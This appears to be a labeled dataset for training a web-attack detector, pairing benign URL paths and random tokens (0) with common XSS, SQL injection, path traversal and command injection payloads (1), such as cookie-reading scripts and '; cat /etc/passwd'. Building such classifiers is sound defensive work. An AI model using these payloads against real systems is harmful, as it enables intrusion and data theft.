javascript:alert(1),1
about,0
/home?id=7397,0
onerror=alert(1),1
../../../../etc/passwd,1
<script>var a=67;alert(a)</script>,1
<script>var a=23;alert(a)</script>,1
' OR 2=3 --,1
<script>var a=308;alert(a)</script>,1
' OR 5=9 --,1
/user?session=34444,0
admin%00' OR 1=1,1
/home?session=14508,0
/dashboard?id=3748,0
' OR 8=3 --,1
' OR 2=6 --,1
' OR '1'='1,1
SIadLfPxPwwn,0
' OR 3=5 --,1
/profile?session=43447,0
KzTjipBH,0
' OR 4=1 --,1
/home?id=9187,0
' OR 2=8 --,1
/user?session=57015,0
/settings?id=9150,0
' OR '1'='1,1
/contact?session=27419,0
admin' --,1
' OR 9=8 --,1
cart,0
/index?session=98237,0
<script>var a=591;alert(a)</script>,1
/login?session=56711,0
YFajUYDCP,0
register,0
/dashboard?id=8572,0
/checkout?id=9372,0
<script>var a=867;alert(a)</script>,1
/index?session=97879,0
/cart?session=27054,0
<script>var a=558;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
; cat /etc/passwd,1
<script>var a=908;alert(a)</script>,1
../../../../etc/passwd,1
' OR 8=6 --,1
mRpJ8cLjK0MtP,0
' OR 8=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=62720,0
/register?session=84559,0
<script>var a=706;alert(a)</script>,1
admin' --,1
/blog?id=6700,0
' OR 2=8 --,1
/blog?id=2423,0
index,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/blog?session=22030,0
qUm8bNzz2G4O,0
/index?session=37358,0
/contact?id=5390,0
admin'/* bypass */OR 1=1,1
| whoami,1
' OR '1'='1,1
<script>var a=388;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
/user?session=98588,0
/login?id=8089,0
<script>var a=972;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
profile,0
/checkout?id=6587,0
/index?session=56563,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=6448,0
/settings?session=47684,0
admin' --,1
/index?session=84356,0
' OR 4=6 --,1
<script>var a=880;alert(a)</script>,1
/profile?id=3417,0
zm1zrDax,0
settings,0
cart,0
/profile?id=4551,0
javascript:alert(1),1
' OR 7=6 --,1
<script>var a=76;alert(a)</script>,1
onerror=alert(1),1
settings,0
/contact?id=944,0
/search?id=1628,0
/search?id=8106,0
| whoami,1
/about?id=2928,0
register,0
contact,0
../../../../etc/passwd,1
/cart?session=79787,0
q6zO8PJk,0
s E l E c T * f R o M a d m i n,1
contact,0
SX46TX2QR63,0
i6id9upK8SupLQy,0
/cart?id=8163,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
<script>var a=740;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cohQLXiJMtqQG,0
<script>var a=499;alert(a)</script>,1
onerror=alert(1),1
/search?session=39438,0
/login?id=2980,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=8090,0
user,0
' OR 1=1 --,1
/profile?session=35331,0
user,0
<script>var a=144;alert(a)</script>,1
<script>var a=632;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=68;alert(a)</script>,1
admin' --,1
<script>var a=97;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/settings?session=19702,0
admin' --,1
1' o r '1'='1,1
cCezxPc4nmAuO6,0
/dashboard?id=2214,0
hfZnnCwL,0
/login?id=1834,0
' OR 8=7 --,1
/profile?id=6115,0
contact,0
<script>var a=355;alert(a)</script>,1
| whoami,1
/index?id=8348,0
login,0
<script>var a=721;alert(a)</script>,1
/checkout?session=26799,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/home?session=98075,0
/index?id=6364,0
s E l E c T * f R o M a d m i n,1
<script>var a=595;alert(a)</script>,1
GCKisLKrWlUDGJ,0
/about?id=4077,0
' OR 2=2 --,1
/profile?session=85242,0
s E l E c T * f R o M a d m i n,1
/login?id=2890,0
<script>var a=596;alert(a)</script>,1
/user?session=39209,0
register,0
1' o r '1'='1,1
javascript:alert(1),1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
| whoami,1
<script>alert(document.cookie)</script>,1
admin' --,1
admin'/* bypass */OR 1=1,1
<script>var a=514;alert(a)</script>,1
admin%00' OR 1=1,1
' OR 7=4 --,1
/settings?session=25832,0
aKsvtaShO5zyZ55,0
' OR 7=6 --,1
admin'/* bypass */OR 1=1,1
LEiklmojksfB,0
/index?session=52566,0
../../../windows/win.ini,1
../../../windows/win.ini,1
onerror=alert(1),1
admin' --,1
H8MdbBFYiH,0
/settings?id=5874,0
' OR 9=7 --,1
home,0
../../../windows/win.ini,1
' OR '1'='1,1
' OR 5=6 --,1
/index?session=25084,0
| whoami,1
/login?id=3138,0
<script>var a=451;alert(a)</script>,1
' OR 9=1 --,1
/dashboard?id=5929,0
<script>var a=204;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/contact?id=5194,0
<script>var a=552;alert(a)</script>,1
../../../../etc/passwd,1
urH3X9bS5cpqM,0
' OR 8=4 --,1
igmHc8wP0Pb,0
; cat /etc/passwd,1
' OR 2=3 --,1
1' o r '1'='1,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
/about?id=5722,0
/settings?session=18920,0
/checkout?id=4554,0
admin' --,1
/dashboard?session=78836,0
GAyv4uVPc,0
; cat /etc/passwd,1
1' o r '1'='1,1
../../../windows/win.ini,1
../../../windows/win.ini,1
0ZAP8oDHFJljc,0
about,0
/user?id=721,0
admin' --,1
DclCpFW0YOeVVDg,0
javascript:alert(1),1
LWrl0gaJ6,0
../../../windows/win.ini,1
<script>var a=968;alert(a)</script>,1
' OR 5=1 --,1
/cart?session=19097,0
/settings?id=6532,0
I4BmhN2RVV1f0ME,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
dashboard,0
<script>var a=496;alert(a)</script>,1
/checkout?session=56905,0
' OR 3=9 --,1
<script>var a=903;alert(a)</script>,1
onerror=alert(1),1
/profile?id=4545,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
m7sDQn7nPy9v,0
' OR 7=3 --,1
' OR 4=6 --,1
/dashboard?session=87904,0
/home?session=41778,0
<script>alert(document.cookie)</script>,1
/profile?id=6903,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?id=3992,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=327;alert(a)</script>,1
/dashboard?session=46058,0
| whoami,1
s E l E c T * f R o M a d m i n,1
' OR 6=3 --,1
' OR '1'='1,1
/user?session=51358,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=62264,0
| whoami,1
index,0
<script>var a=143;alert(a)</script>,1
' OR 8=9 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
javascript:alert(1),1
/search?session=63781,0
ptnntN74aT4SU,0
' OR 9=3 --,1
lSsTgSWaxrzpr05,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 9=5 --,1
admin%00' OR 1=1,1
MgTZbz37m,0
/cart?session=25784,0
cart,0
3pC6eGOtIDtp,0
onerror=alert(1),1
/checkout?session=74153,0
/cart?id=3393,0
settings,0
/index?session=67013,0
' OR 1=1 --,1
yRI08mEbQrGgO,0
' OR 6=4 --,1
/register?id=7379,0
../../../../etc/passwd,1
/search?id=4170,0
/home?session=86391,0
/dashboard?session=60613,0
' OR 7=3 --,1
CDmMdAnZ,0
/register?session=85963,0
' OR 2=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
/checkout?id=987,0
' OR 5=9 --,1
../../../../etc/passwd,1
' OR 8=3 --,1
' OR 7=3 --,1
tVzbmPTBTOJ,0
| whoami,1
/contact?id=6247,0
' OR 3=2 --,1
<script>var a=803;alert(a)</script>,1
' OR 2=1 --,1
' OR 6=2 --,1
smFJwr08p,0
/register?id=8531,0
/checkout?id=4055,0
' OR '1'='1,1
dashboard,0
<script>var a=988;alert(a)</script>,1
/cart?session=94521,0
/index?id=4005,0
<script>var a=529;alert(a)</script>,1
/search?session=92402,0
; cat /etc/passwd,1
2SI8WPYXd9yYFGu,0
' OR 4=2 --,1
qygCVhRGgKj,0
/contact?session=50469,0
' OR 5=1 --,1
blog,0
/search?session=55584,0
<script>alert(document.cookie)</script>,1
/checkout?id=2969,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=83419,0
admin' --,1
| whoami,1
register,0
<script>var a=452;alert(a)</script>,1
<script>var a=857;alert(a)</script>,1
' OR 1=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
' OR 2=4 --,1
/blog?session=18280,0
/dashboard?id=9333,0
<script>var a=158;alert(a)</script>,1
lf9gJqSh8VSn6,0
/register?session=17923,0
; cat /etc/passwd,1
/home?session=46215,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
1' o r '1'='1,1
kGfY2t9yK,0
/dashboard?session=77226,0
2vV28XOgPBo,0
' OR '1'='1,1
6BDHjXG8CfXdVE,0
about,0
ra7HoFqzFr24,0
<script>var a=171;alert(a)</script>,1
../../../windows/win.ini,1
cart,0
' OR 1=1 --,1
/about?session=16440,0
admin' --,1
/home?session=50905,0
J8WBOkpwNPwt,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/login?id=2995,0
<script>var a=152;alert(a)</script>,1
profile,0
ls5H3luYz5pTw,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
checkout,0
/blog?id=7081,0
/blog?id=1447,0
<script>alert(document.cookie)</script>,1
<script>var a=255;alert(a)</script>,1
/profile?session=46317,0
| whoami,1
' OR 4=4 --,1
' OR 8=5 --,1
<script>var a=444;alert(a)</script>,1
about,0
/home?id=3979,0
/about?session=91237,0
65zv15ErS6or,0
onerror=alert(1),1
XZtzLCGSVw7,0
/register?session=47697,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
4EWfX4Qlhyfkm2Y,0
<script>alert(document.cookie)</script>,1
2UAlNIBx,0
1' o r '1'='1,1
index,0
/dashboard?id=8953,0
/cart?id=5468,0
<script>var a=690;alert(a)</script>,1
JHFMFjif9GUJ0,0
login,0
UgLjQT6XfpZC7Cf,0
javascript:alert(1),1
1' o r '1'='1,1
/login?session=26236,0
<script>var a=425;alert(a)</script>,1
/user?session=47955,0
<script>var a=199;alert(a)</script>,1
/dashboard?session=16706,0
<script>alert(document.cookie)</script>,1
/contact?session=16002,0
/profile?id=2540,0
index,0
admin' --,1
index,0
contact,0
about,0
/blog?session=19868,0
cart,0
<script>var a=341;alert(a)</script>,1
/user?id=18,0
<script>alert(document.cookie)</script>,1
ahvShD6BjPLwr,0
<script>var a=411;alert(a)</script>,1
jAmyOEks5xIxIa,0
njyV1P2oN,0
/about?session=73762,0
s E l E c T * f R o M a d m i n,1
/home?session=47619,0
' OR 6=5 --,1
profile,0
/checkout?id=2609,0
/search?id=6294,0
RHjkrLDhzqQSmcW,0
<script>var a=719;alert(a)</script>,1
<script>var a=672;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
<script>var a=601;alert(a)</script>,1
<script>var a=157;alert(a)</script>,1
QhKdvh4lSGBvPJB,0
/user?id=9473,0
cart,0
../../../../etc/passwd,1
/settings?id=6589,0
UuUM3zzOhP3LgU9,0
/settings?id=6523,0
dElJw2Ih1DER,0
blog,0
../../../../etc/passwd,1
/index?session=65291,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
<script>var a=864;alert(a)</script>,1
register,0
' OR 4=8 --,1
<script>var a=765;alert(a)</script>,1
<script>var a=878;alert(a)</script>,1
<script>var a=250;alert(a)</script>,1
admin' --,1
/checkout?id=2812,0
fjIw8peQ,0
/index?session=11783,0
admin' --,1
; cat /etc/passwd,1
QoLcAtlQ8kIKUTT,0
' OR 1=1 --,1
| whoami,1
MxH66OZfYBPxN,0
/contact?session=75439,0
user,0
wSZEbjN5zKxunq,0
EDKlecOiQM4Fp,0
/user?session=56169,0
s E l E c T * f R o M a d m i n,1
' OR 9=1 --,1
/settings?session=35220,0
<script>var a=998;alert(a)</script>,1
' OR 1=5 --,1
nBjyIi1wjN,0
user,0
/index?id=4389,0
/about?id=3994,0
/login?id=8306,0
yFXmg9U1Nbd5OW,0
/blog?id=6054,0
/checkout?session=30034,0
settings,0
search,0
' OR 1=1 --,1
/blog?id=2785,0
VV9p4tXq,0
| whoami,1
O9VgnCENzTj,0
javascript:alert(1),1
' OR '1'='1,1
settings,0
../../../windows/win.ini,1
<script>var a=492;alert(a)</script>,1
/register?id=4286,0
/checkout?id=9159,0
' OR 7=2 --,1
' OR 4=2 --,1
ozDlvLMtJ,0
/index?session=21198,0
o0seKL4Kw,0
<script>var a=71;alert(a)</script>,1
admin' --,1
| whoami,1
zD7LsQfwvy,0
' OR '1'='1,1
<script>var a=682;alert(a)</script>,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=1 --,1
1' o r '1'='1,1
/settings?session=34419,0
<script>var a=503;alert(a)</script>,1
UVB8AJLEkkMX,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=8 --,1
/cart?session=26311,0
login,0
/checkout?session=42856,0
/settings?session=76531,0
Y5L4JHeNVAUvNIA,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=24743,0
blog,0
fn7JX1IDyjsT,0
3Q3brT5hsiMVVo,0
/login?id=3449,0
qWbAf4nI,0
' OR '1'='1,1
/home?id=2353,0
' OR 3=2 --,1
login,0
/profile?id=2343,0
/profile?session=17527,0
/profile?session=10409,0
' OR 5=8 --,1
; cat /etc/passwd,1
javascript:alert(1),1
<script>var a=646;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=437;alert(a)</script>,1
onerror=alert(1),1
nGOaZEtDASZo,0
user,0
/user?session=46046,0
cart,0
| whoami,1
l2txtmXUiel,0
YTwQCx0i4P,0
' OR 1=7 --,1
/checkout?session=72751,0
../../../../etc/passwd,1
' OR 3=3 --,1
U5l0OdjTn2le,0
login,0
' OR '1'='1,1
profile,0
/checkout?session=92598,0
/checkout?session=73970,0
../../../../etc/passwd,1
../../../../etc/passwd,1
jQ8IFGne2,0
/login?id=7645,0
admin'/* bypass */OR 1=1,1
search,0
/index?id=7943,0
/profile?id=3428,0
Q0j0LvRX,0
| whoami,1
/contact?session=39670,0
admin%00' OR 1=1,1
/contact?id=5605,0
<script>var a=961;alert(a)</script>,1
' OR 9=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
WC208UyQ4X,0
QZfBXGwuDiRN4K,0
; cat /etc/passwd,1
| whoami,1
1' o r '1'='1,1
' OR 4=7 --,1
2k7ZTWtTJ7HKj,0
checkout,0
<script>var a=141;alert(a)</script>,1
' OR 4=1 --,1
NcXH13RRXgiP,0
admin' --,1
/about?id=9107,0
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=145;alert(a)</script>,1
' OR 8=1 --,1
cart,0
1' o r '1'='1,1
' OR 8=3 --,1
' OR 6=5 --,1
register,0
about,0
<script>var a=231;alert(a)</script>,1
/blog?session=27554,0
search,0
cart,0
/contact?session=15352,0
/home?session=74367,0
; cat /etc/passwd,1
login,0
; cat /etc/passwd,1
i4AMu0Aom5fS,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=6807,0
' OR 4=3 --,1
' OR '1'='1,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=997,0
/home?session=13797,0
' OR 4=9 --,1
/dashboard?session=39346,0
/dashboard?id=7976,0
admin%00' OR 1=1,1
' OR 2=2 --,1
sKktgA31iOYMHAJ,0
' OR 7=3 --,1
/contact?session=87906,0
/login?session=57931,0
/contact?session=19388,0
' OR 9=1 --,1
<script>alert(document.cookie)</script>,1
Eowo6K8Jq9P,0
rKqX49hY6RT,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=3237,0
/profile?session=61361,0
<script>var a=468;alert(a)</script>,1
PKmRBAALJ4z,0
contact,0
/login?session=95866,0
' OR 2=4 --,1
' OR 1=1 --,1
' OR 7=3 --,1
W2gbcgp097M10Ay,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
/cart?session=47331,0
register,0
' OR 3=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=3067,0
QKmaJwXwakw5a,0
Z91jev3iTU2,0
eRYbhaQDdg,0
Lj6ov1yrutk,0
/index?id=1313,0
/search?session=47292,0
/user?session=90332,0
contact,0
/home?session=73196,0
' OR 5=7 --,1
' OR 7=3 --,1
s E l E c T * f R o M a d m i n,1
/login?session=90442,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
A3p9pRoQmva,0
H3xV8nvR23w,0
' OR 2=7 --,1
cart,0
gy19hZpsHLcQiR,0
<script>alert(document.cookie)</script>,1
/about?id=7316,0
8eKHSW3LScG,0
profile,0
javascript:alert(1),1
' OR '1'='1,1
/cart?session=89774,0
/register?session=61688,0
/dashboard?session=96186,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
checkout,0
k9wE1Muw,0
q6z3MKqFzL8C,0
<script>var a=89;alert(a)</script>,1
' OR '1'='1,1
<script>var a=483;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=4 --,1
index,0
login,0
1' o r '1'='1,1
/settings?session=18816,0
31P7az6vhKSHJLk,0
' OR 7=7 --,1
/checkout?id=4986,0
' OR 3=5 --,1
' OR 2=4 --,1
admin'/* bypass */OR 1=1,1
/login?session=75046,0
home,0
| whoami,1
' OR 1=1 --,1
onerror=alert(1),1
onerror=alert(1),1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=60998,0
cart,0
contact,0
/index?id=9457,0
/dashboard?session=51633,0
<script>var a=118;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
xRgXe6DW07m7,0
checkout,0
/login?session=47346,0
<script>var a=126;alert(a)</script>,1
/blog?id=2199,0
/login?session=65086,0
sGmkYXZc,0
y3VjJQ3vb9fDd,0
/user?id=941,0
<script>var a=400;alert(a)</script>,1
blog,0
javascript:alert(1),1
/user?session=14332,0
| whoami,1
/register?session=36002,0
/contact?session=12600,0
<script>var a=966;alert(a)</script>,1
S6Fy4ThAdc1IA,0
/login?id=4378,0
' OR 1=1 --,1
blog,0
uOZt90037,0
/dashboard?session=81753,0
admin' --,1
' OR 6=2 --,1
<script>var a=542;alert(a)</script>,1
' OR 1=6 --,1
register,0
' OR 4=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
<script>var a=224;alert(a)</script>,1
' OR 1=1 --,1
; cat /etc/passwd,1
YglpxouHWgMJyO,0
/index?id=5050,0
<script>var a=206;alert(a)</script>,1
' OR 9=4 --,1
' OR 3=8 --,1
/settings?id=7526,0
admin' --,1
' OR 4=1 --,1
1vrIOKyV3zKsi,0
/profile?session=76246,0
' OR 5=9 --,1
register,0
' OR 6=6 --,1
index,0
Cjqn78GI,0
onerror=alert(1),1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=9 --,1
jZFsqbCwE,0
' OR 6=1 --,1
' OR 1=1 --,1
' OR 5=6 --,1
IGnGDi1HnWjQ,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=8366,0
<script>var a=382;alert(a)</script>,1
index,0
/profile?id=3154,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
checkout,0
t4PEChed,0
dashboard,0
/home?session=16897,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=8 --,1
checkout,0
<script>var a=157;alert(a)</script>,1
5nTgD0KOHz,0
' OR 1=9 --,1
; cat /etc/passwd,1
1' o r '1'='1,1
/login?id=173,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
admin%00' OR 1=1,1
/about?id=9571,0
checkout,0
/cart?session=10123,0
admin'/* bypass */OR 1=1,1
/settings?id=7573,0
/cart?id=9545,0
' OR 5=7 --,1
' OR 2=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=5 --,1
/profile?id=2403,0
/profile?id=7243,0
/register?session=16644,0
/index?session=15909,0
' OR '1'='1,1
/contact?id=4785,0
/cart?id=4068,0
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/blog?id=6469,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
onerror=alert(1),1
; cat /etc/passwd,1
' OR 6=2 --,1
1' o r '1'='1,1
onerror=alert(1),1
qjljtW6wq5LyPVd,0
PskIXn56tb,0
/about?id=8568,0
s E l E c T * f R o M a d m i n,1
blog,0
cart,0
/blog?session=61056,0
' OR 6=4 --,1
; cat /etc/passwd,1
admin' --,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
' OR 3=5 --,1
6CCxIr46C,0
/index?id=8545,0
dashboard,0
<script>var a=392;alert(a)</script>,1
/cart?session=94678,0
admin%00' OR 1=1,1
DwtJwADow,0
' OR 8=2 --,1
<script>var a=305;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=420;alert(a)</script>,1
onerror=alert(1),1
<script>var a=433;alert(a)</script>,1
' OR 4=7 --,1
/dashboard?session=45471,0
1' o r '1'='1,1
/settings?id=7395,0
/login?session=72779,0
user,0
' OR 1=1 --,1
admin%00' OR 1=1,1
/blog?id=7747,0
../../../../etc/passwd,1
GmvG1unCmpIHML,0
/checkout?session=74390,0
wooNJNkI3,0
i8yDO0DMMiWR,0
admin' --,1
' OR 5=7 --,1
settings,0
s E l E c T * f R o M a d m i n,1
/login?session=30304,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
QUWmsopUBRxwl,0
/user?id=3584,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
<script>var a=374;alert(a)</script>,1
/dashboard?session=60473,0
index,0
/login?session=10514,0
../../../../etc/passwd,1
Vu3K3G6Crs,0
/cart?id=5442,0
/checkout?id=5142,0
/dashboard?id=8154,0
javascript:alert(1),1
qUAVvqUUW2L86y,0
Ru5bbM4f0XthC,0
/home?id=7716,0
<script>var a=140;alert(a)</script>,1
Sc9fsVx6W3N,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
onerror=alert(1),1
<script>var a=941;alert(a)</script>,1
/settings?session=55482,0
about,0
checkout,0
/checkout?session=49595,0
/blog?session=88751,0
s E l E c T * f R o M a d m i n,1
/profile?id=5613,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
v4VbyQR3CeZMpR,0
/home?session=87643,0
sSszdobhLum1qnU,0
<script>var a=127;alert(a)</script>,1
/about?session=64815,0
onerror=alert(1),1
/index?id=658,0
| whoami,1
/profile?id=6978,0
/checkout?id=556,0
javascript:alert(1),1
EM4y21FYaE,0
/profile?session=57406,0
XlMKSjQRFH9,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
javascript:alert(1),1
<script>var a=503;alert(a)</script>,1
search,0
../../../../etc/passwd,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
' OR 4=8 --,1
cart,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/home?session=66039,0
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=25971,0
/checkout?id=6310,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=722;alert(a)</script>,1
/home?id=7259,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
' OR 1=1 --,1
qTe0TI0eN,0
/home?id=7412,0
<script>var a=796;alert(a)</script>,1
ena97or5G,0
/contact?session=33564,0
/cart?session=21910,0
../../../windows/win.ini,1
/index?id=4033,0
/search?id=404,0
profile,0
/search?session=86240,0
' OR 1=1 --,1
../../../../etc/passwd,1
/search?session=94911,0
' OR 7=3 --,1
' OR 3=9 --,1
' OR '1'='1,1
/settings?session=70696,0
/about?id=4658,0
<script>var a=420;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
settings,0
<script>var a=388;alert(a)</script>,1
admin%00' OR 1=1,1
' OR 9=2 --,1
<script>var a=164;alert(a)</script>,1
| whoami,1
/index?id=2731,0
' OR 6=6 --,1
/about?session=59898,0
../../../windows/win.ini,1
I5NUPDDeQt6,0
' OR 5=4 --,1
<script>var a=602;alert(a)</script>,1
/login?id=1222,0
<script>var a=275;alert(a)</script>,1
/cart?session=69202,0
/register?id=6784,0
index,0
/cart?session=67790,0
/index?id=6738,0
' OR 1=1 --,1
/home?id=1511,0
/checkout?id=8996,0
| whoami,1
<script>var a=330;alert(a)</script>,1
/profile?id=8896,0
index,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?session=51655,0
gQPZEypkir6Xin,0
onerror=alert(1),1
/user?session=76801,0
/login?id=9711,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?id=4192,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=7932,0
/about?session=85992,0
s E l E c T * f R o M a d m i n,1
/login?session=13299,0
' OR 1=4 --,1
<script>alert(document.cookie)</script>,1
/profile?id=4658,0
/index?session=35832,0
JOIeWm2dhWiew,0
index,0
/register?session=59930,0
login,0
<script>var a=271;alert(a)</script>,1
' OR 1=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
oCxiKTCER7LXrA3,0
/cart?id=2100,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=8 --,1
/dashboard?id=7546,0
../../../../etc/passwd,1
../../../../etc/passwd,1
| whoami,1
' OR 1=1 --,1
| whoami,1
mAH0CGvnp,0
admin' --,1
jwZy0pmXYZ,0
register,0
admin'/* bypass */OR 1=1,1
<script>var a=112;alert(a)</script>,1
' OR 8=4 --,1
jfKO8Ju2,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
<script>var a=845;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=6766,0
7IbOFahugS3ZThD,0
../../../windows/win.ini,1
JcZ5zyHLq8n,0
/cart?id=4676,0
/cart?id=2088,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=965;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=1705,0
rmVRcoAnO,0
javascript:alert(1),1
<script>var a=282;alert(a)</script>,1
' OR 3=3 --,1
<script>var a=441;alert(a)</script>,1
onerror=alert(1),1
<script>var a=70;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/index?id=8969,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=8513,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
CJvTKrvLCfVlxk4,0
blog,0
' OR 4=5 --,1
admin' --,1
<script>var a=520;alert(a)</script>,1
onerror=alert(1),1
| whoami,1
/user?session=37769,0
JNUKAcWWiUG,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
bOSMwEv5CkJ88Ib,0
' OR 8=6 --,1
s E l E c T * f R o M a d m i n,1
' OR 3=9 --,1
C7QXEpHen,0
/contact?id=6934,0
s E l E c T * f R o M a d m i n,1
cart,0
<script>var a=514;alert(a)</script>,1
javascript:alert(1),1
/settings?id=8932,0
/profile?id=9735,0
<script>var a=645;alert(a)</script>,1
/about?id=3518,0
<script>var a=886;alert(a)</script>,1
1' o r '1'='1,1
/settings?id=6569,0
tEGZjQcgV8,0
/settings?session=27291,0
/user?session=62416,0
home,0
; cat /etc/passwd,1
<script>var a=434;alert(a)</script>,1
/profile?id=8323,0
' OR 8=1 --,1
s E l E c T * f R o M a d m i n,1
register,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
fUPtZ0Qle48Llg5,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
| whoami,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
/home?session=35929,0
/index?session=61622,0
/user?session=75097,0
' OR '1'='1,1
/about?session=71312,0
admin%00' OR 1=1,1
<script>var a=619;alert(a)</script>,1
/search?session=90777,0
/contact?session=88475,0
admin%00' OR 1=1,1
/login?id=8536,0
OdzWyW5Jfy1g,0
